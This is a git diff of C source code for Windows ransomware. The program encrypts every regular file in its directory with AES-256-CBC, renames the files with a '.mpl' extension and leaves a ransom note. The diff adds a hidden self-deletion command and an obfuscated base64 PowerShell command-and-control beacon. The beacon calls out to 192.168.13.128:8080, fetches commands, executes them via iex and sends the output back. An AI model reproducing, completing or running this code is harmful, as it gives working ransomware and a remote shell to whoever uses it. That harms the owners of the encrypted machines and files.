@@ -12,22 +12,9 @@
 
 // r@ns0mW4r3
 
-void he(void) {
-    ERR_print_errors_fp(stderr);
-    abort();
-}
-
-void gk(unsigned char *key, size_t key_length) {
-    if (RAND_bytes(key, key_length) != 1) {fprintf(stderr, "Error generating random key\n");exit(1);}
-}
-
-void giv(unsigned char* iv, size_t iv_size) {
-    if (RAND_bytes(iv, iv_size) != 1) {
-        perror("Error generating iv\n");
-        exit(1);
-    }
-}
-
+void he(void) {ERR_print_errors_fp(stderr);abort();}
+void gk(unsigned char *key, size_t key_length) {if (RAND_bytes(key, key_length) != 1) {fprintf(stderr, "Error generating random key\n");exit(1);}}
+void giv(unsigned char* iv, size_t iv_size) {if (RAND_bytes(iv, iv_size) != 1) {perror("Error generating iv\n");exit(1);}}
 void ct() {
     time_t now;
     time(&now);
@@ -38,17 +25,25 @@ void ct() {
     specified_time.tm_mday = 11;                  
     time_t specified_time_t = mktime(&specified_time);
     if (difftime(now, specified_time_t) > 0) {
-        printf("Current date is later than the 11th of December.\n");
-        printf("This program will not run due to security presets.\n");
-        printf("Press Enter to continue...\n");
+        printf("Current date is later than the --th of --- month.\nPress Enter to continue...\n");
         char input[256];
         fgets(input, sizeof(input), stdin);
+        sd();
         exit(1);
     } else {
-        printf("Current date is before the 11th of December.\n");
+        printf("Current date is before ----\n");
         printf("This r@nS0Mw@r3 will run.");
     }
 }
+
+const char* get_filename(const char *path) {
+    const char *filename = strrchr(path, '\\');
+    if (!filename) {
+        filename = strrchr(path, '/');
+    }
+    return filename ? filename + 1 : path;
+}
+
 
 void ch(char* str, unsigned char hash[SHA256_DIGEST_LENGTH] ) {
     SHA256_CTX sha256;
@@ -69,35 +64,30 @@ void sc() {
         perror("Cannot get current directory\n");
         exit(1);
     }
-    if (strcmp(cwd, "Test") != 1) {
-        char* lastdir = strrchr(cwd, '\\');
-        if (lastdir != NULL) {
-            lastdir++;
-            unsigned char hash[SHA256_DIGEST_LENGTH];
-            ch(lastdir, hash);
-            if (memcmp(hash, expected_hash, SHA256_DIGEST_LENGTH) == 0) {
-                printf("Running in the Test directory.\n");
-            } else {
-                perror("Unsafe directory.\n");
-                exit(1);
-            }
+    char* lastdir = strrchr(cwd, '\\');
+    if (lastdir != NULL) {
+        lastdir++;
+        unsigned char hash[SHA256_DIGEST_LENGTH];
+        ch(lastdir, hash);
+        if (memcmp(hash, expected_hash, SHA256_DIGEST_LENGTH) == 0) {
+            printf("Running in the required directory.\n");
         } else {
-            printf("Could not determine the directory name.\n");
+            perror("Unsafe directory.\n");
+            sd();
         }
+    } else {
+        printf("Could not determine the directory name.\n");
     }
     ct();
 }
 
-void sign(char* fn) {
-    strcat(fn, ".mpl");
-}
+void sign(char* fn) {strcat(fn, ".mpl");}
 
 int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
             unsigned char *iv, unsigned char *ciphertext) {
     EVP_CIPHER_CTX *ctx;
     int len;
     int ciphertext_len;
-
     if (!(ctx = EVP_CIPHER_CTX_new())) he();
     if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
         he();
@@ -131,6 +121,15 @@ void ed(const char *dir_path) {
         if (stat(file_path, &statbuf) == 0) {
             if (S_ISREG(statbuf.st_mode)) {
                 char ofilename[1024];
+                char test[MAX_PATH];
+                GetModuleFileName(NULL, test, MAX_PATH);
+                printf("test: %s\n", get_filename(test));
+                printf("file path: %s\n------\n", get_filename(file_path));
+
+                if (strcmp(get_filename(test), get_filename(file_path)) == 0){
+                    printf("found\n");
+                    continue;
+                }
 
                 FILE* tfile = fopen(file_path, "rb");
                 strcpy(ofilename, file_path);
@@ -155,36 +154,43 @@ void ed(const char *dir_path) {
     fclose(important_info);
 }
 
-// void openConnection() {
-//     const char* command = "powershell.exe -Command \"$s='192.168.13.128:8080';$i='435693df-fe69567a-a0ccab9f';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/435693df -Headers @{\\\"X-bd3b-7843\\\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/fe69567a -Headers @{\\\"X-bd3b-7843\\\"=$i}).Content;if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/a0ccab9f -Method POST -Headers @{\\\"X-bd3b-7843\\\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\"";
-//     // Initialize the startup info structure
-//     STARTUPINFO si = { sizeof(si) };
-//     PROCESS_INFORMATION pi;
-    
-//     // Hide the window by setting the flag
-//     si.dwFlags = STARTF_USESHOWWINDOW;
-//     si.wShowWindow = SW_HIDE;  // This hides the window
-    
-//     // Create the process
-//     if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-//         // Wait for the process to finish
-//         WaitForSingleObject(pi.hProcess, INFINITE);
-        
-//         // Close process and thread handles
-//         CloseHandle(pi.hProcess);
-//         CloseHandle(pi.hThread);
-//     }
-// }
+void sd() {
+    char szFilePath[MAX_PATH];
+    char szCmd[MAX_PATH + 10];
+    GetModuleFileName(NULL, szFilePath, MAX_PATH);
+    sprintf(szCmd, "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & Del \"%s\"", szFilePath);
+    WinExec(szCmd, SW_HIDE);
+    exit(EXIT_SUCCESS);
+}
 
+void oc() {
+    const char* command = "powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAzAC4AMQAyADgAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGYAZAA1ADQANABjADcANgAtAGQAZgBhAGMAMABkADkAYQAtAGMAZgAzAGMAYgAxADQAZgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBmAGQANQA0ADQAYwA3ADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOABjAGUAMgAtADkAYgA1ADYAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZABmAGEAYwAwAGQAOQBhACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADgAYwBlADIALQA5AGIANQA2ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpACcAJwBlACcAJwB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AYwBmADMAYwBiADEANABmACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOABjAGUAMgAtADkAYgA1ADYAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA== ";
+    // Initialize the startup info structure
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Hide the window by setting the flag
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // This hides the window
+    
+    // Create the process
+    if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        // Wait for the process to finish
+        // WaitForSingleObject(pi.hProcess, INFINITE);
+        // Close process and thread handles
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
 void write_ransom_note() {
     FILE *file = fopen("RANSOM_NOTE.txt", "w");
     if (file == NULL) {
         return;
     }
     fprintf(file, "Your files have been encrypted.\n");
-    fprintf(file, "To decrypt them, please buy me a coffee, at garyphoneix@gmail.com \n");
-    fprintf(file, "Preferably Latte Please :>\n");
+    fprintf(file, "To decrypt them, please buy me a coffee\n");
+    fprintf(file, "Preferably Einspanner Please :>\n");
     fclose(file);
 }
 
-int main (void) {sc();ed(".");/**openConnection()**/; write_ransom_note();}
+int main (void) {sc();ed(".");/**oc()**/; write_ransom_note();sd();}
